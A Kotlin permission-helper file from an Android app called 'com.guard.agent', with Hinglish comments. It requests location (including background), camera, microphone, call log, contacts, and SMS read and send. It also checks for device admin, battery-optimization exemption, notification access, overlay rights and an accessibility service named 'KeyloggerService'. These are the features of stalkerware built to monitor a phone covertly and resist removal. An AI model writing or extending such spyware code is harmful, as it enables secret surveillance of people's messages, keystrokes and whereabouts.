package com.guard.agent.utils

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import com.guard.agent.receivers.AdminReceiver

object PermissionUtils {

    /** Saari basic runtime permissions */
    fun getRuntimePermissions(): Array<String> {
        val list = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            list.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return list.toTypedArray()
    }

    /** Check ki saari permissions granted hain ya nahi */
    fun hasAllRuntimePermissions(ctx: Context): Boolean {
        return getRuntimePermissions().all {
            ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    /** Device Admin active hai? */
    fun isAdminActive(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
    }

    /** Battery optimization ignore hai? */
    fun isBatteryOptimizationIgnored(ctx: Context): Boolean {
        val pw = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pw.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    /** Accessibility service enabled hai? */
    fun isAccessibilityEnabled(ctx: Context): Boolean {
        val service = "${ctx.packageName}/${ctx.packageName}.services.KeyloggerService"
        val enabled = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(service)
    }

    /** Notification listener enabled hai? */
    fun isNotificationListenerEnabled(ctx: Context): Boolean {
        val enabled = Settings.Secure.getString(
            ctx.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return enabled.contains(ctx.packageName)
    }

    /** Saari special permissions check karo */
    fun getMissingSpecialPermissions(ctx: Context): List<String> {
        val missing = mutableListOf<String>()
        if (!isAdminActive(ctx)) missing.add("Device Admin")
        if (!isBatteryOptimizationIgnored(ctx)) missing.add("Battery Optimization")
        if (!isAccessibilityEnabled(ctx)) missing.add("Accessibility")
        if (!isNotificationListenerEnabled(ctx)) missing.add("Notification Access")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(ctx)) missing.add("Overlay Permission")
        }
        return missing
    }
}
